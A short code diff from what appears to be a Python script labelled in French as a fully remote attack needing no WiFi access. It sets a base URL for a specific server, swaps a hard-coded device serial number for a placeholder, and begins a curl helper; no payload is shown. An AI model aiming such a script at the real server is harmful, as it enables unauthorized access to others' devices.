@@ -9,7 +9,7 @@ Attaque 100% distante (aucun accès WiFi requis).
 import time, json, subprocess
 
 BASE = "http://ai.energizelab.com.cn:8000"
-OUR_SN = "1034331e0162310115f163f601623101"
+OUR_SN = "<SN_AUDITOR>"
 
 def curl_post(path, body, timeout=50):
     result = subprocess.run(
